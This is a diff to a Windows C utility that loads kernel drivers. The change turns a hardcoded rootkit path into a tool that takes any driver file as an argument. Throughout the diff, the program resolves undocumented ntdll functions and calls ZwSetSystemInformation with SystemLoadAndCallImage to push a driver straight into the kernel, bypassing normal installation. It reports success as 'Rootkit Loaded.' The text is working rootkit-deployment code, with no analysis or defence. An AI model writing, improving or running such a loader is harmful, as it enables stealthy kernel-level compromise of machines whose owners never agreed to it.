@@ -5,6 +5,19 @@
 //////////////////////////////////////// 
 #include <windows.h> 
 #include <stdio.h> 
+#include <assert.h>
+
+#define LastErrorToString(errcode, buffer, buffsize) \
+                        FormatMessage( FORMAT_MESSAGE_FROM_SYSTEM,\
+                        NULL,\
+                        errcode,\
+                        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),\
+                        (LPTSTR) buffer,\
+                        buffsize, \
+                        NULL );
+
+
+#define NT_SUCCESS(Status) ((NTSTATUS)(Status) == 0)                
 
 
 
@@ -29,7 +42,7 @@ typedef struct _ANSI_STRING {
 
 
 typedef unsigned long NTSTATUS; 
-#define NT_SUCCESS(Status) ((NTSTATUS)(Status) == 0) 
+
 
 
 NTSTATUS    (__stdcall *ZwSetSystemInformation)         (IN DWORD SystemInformationClass, 
@@ -62,59 +75,102 @@ typedef struct _SYSTEM_LOAD_AND_CALL_IMAGE
 
 
 
-void main(int argc, char *argv[]) 
+
+int do_help()
+{
+
+    printf("The Quick and Dirty SYS loader\nUse: qdsys <file>\nNo UNC paths supported\n");
+
+    return 0;
+}
+
+
+int main(int argc, char *argv[]) 
 { 
 /////////////////////////////////////////////////////////////// 
 // Why mess with Drivers? 
 /////////////////////////////////////////////////////////////// 
 SYSTEM_LOAD_AND_CALL_IMAGE GregsImage; 
-WCHAR daPath[] = L"\\??\\C:\\_root_.sys"; 
 ANSI_STRING str;
+NTSTATUS result;
 
-    ////////////////////////////////////////////////////////////// 
-    // get DLL entry points 
-    ////////////////////////////////////////////////////////////// 
-    if( !(RtlInitUnicodeString =(void *) GetProcAddress( GetModuleHandle("ntdll.dll"), "RtlInitUnicodeString" )) ) 
-    {
-        exit(1); 
-    }
+char fullpathname[1000] = { '\\', '?', '?', '\\', 0 };
 
-    if( !(RtlInitAnsiString =(void *) GetProcAddress( GetModuleHandle("ntdll.dll"), "RtlInitAnsiString" )) ) 
-    {
-        exit(1); 
-    }
 
-    if( !(RtlAnsiStringToUnicodeString = (void *) GetProcAddress( GetModuleHandle("ntdll.dll"), "RtlAnsiStringToUnicodeString" )) ) 
+
+    if(argc != 2) return do_help();
+    
+   // argv1len=strlen(argv[1]);
+
+    result = GetFullPathName(argv[1], sizeof(fullpathname) - 4, fullpathname + 4, NULL);
+
+    if(result == 0)
     {
-        exit(1); 
+        LastErrorToString(GetLastError(), fullpathname, sizeof(fullpathname));
+        printf("Error obtaining path to file %s: %s", argv[1], fullpathname);
     }
     
-
-    if( !(ZwSetSystemInformation = (void *) GetProcAddress( GetModuleHandle("ntdll.dll"), "ZwSetSystemInformation" )) ) 
+    else if((int)result < sizeof(fullpathname))
     {
-        exit(1); 
+        
+        ////////////////////////////////////////////////////////////// 
+        // get DLL entry points 
+        ////////////////////////////////////////////////////////////// 
+        if( !(RtlInitUnicodeString =(void *) GetProcAddress( GetModuleHandle("ntdll.dll"), "RtlInitUnicodeString" )) ) 
+        {
+            printf("Could not get address of RtlInitUnicodeString\n");
+            exit(1); 
+        }
+
+        if( !(RtlInitAnsiString =(void *) GetProcAddress( GetModuleHandle("ntdll.dll"), "RtlInitAnsiString" )) ) 
+        {
+            printf("Could not get address ofRtlInitAnsiString\n");
+            exit(1); 
+        }
+
+        if( !(RtlAnsiStringToUnicodeString = (void *) GetProcAddress( GetModuleHandle("ntdll.dll"), "RtlAnsiStringToUnicodeString" )) ) 
+        {
+            printf("Could not get address RtlAnsiStringToUnicodeString\n");
+            exit(1); 
+        }
+    
+
+        if( !(ZwSetSystemInformation = (void *) GetProcAddress( GetModuleHandle("ntdll.dll"), "ZwSetSystemInformation" )) ) 
+        {
+            printf("Could not get address ZwSetSystemInformation\n");
+            exit(1); 
+        }
+
+
+        RtlInitAnsiString(&str, fullpathname);
+    
+        //RtlInitUnicodeString( &(GregsImage.ModuleName), daPath ); 
+
+        if(!NT_SUCCESS(RtlAnsiStringToUnicodeString( &(GregsImage.ModuleName), &str, TRUE )))
+        {
+            printf("No se pudo inicializar cadena UNICODE\n");
+            exit(1);
+        }
+
+        result=ZwSetSystemInformation(SystemLoadAndCallImage, &GregsImage, sizeof(SYSTEM_LOAD_AND_CALL_IMAGE));
+
+        if(NT_SUCCESS(result)) 
+        { 
+            printf("Rootkit Loaded.\n"); 
+        } 
+        else 
+        { 
+            printf("Rootkit not loaded (NTSTATUS: 0x%08X)\n", result);
+        } 
     }
 
-
-    //RtlInitAnsiString(&str, argv[1]);
-    
-    RtlInitUnicodeString( &(GregsImage.ModuleName), daPath ); 
-
-  /*  if(!NT_SUCCESS(RtlAnsiStringToUnicodeString( &(GregsImage.ModuleName), &str, TRUE )))
+    else
     {
-        printf("No se pudo inicializar cadena UNICODE\n");
-        exit(1);
-    }*/
-
-    if(NT_SUCCESS(ZwSetSystemInformation(SystemLoadAndCallImage, &GregsImage, sizeof(SYSTEM_LOAD_AND_CALL_IMAGE)) )) 
-    { 
-        printf("Rootkit Loaded.\n"); 
-    } 
-    else 
-    { 
-        printf("Rootkit not loaded.\n"); 
-    } 
-
+        assert(0); // ESTO NUNCA DEBERIA OCURRIR
+    }
+    
+    
+    return 0;
 
 } 
 
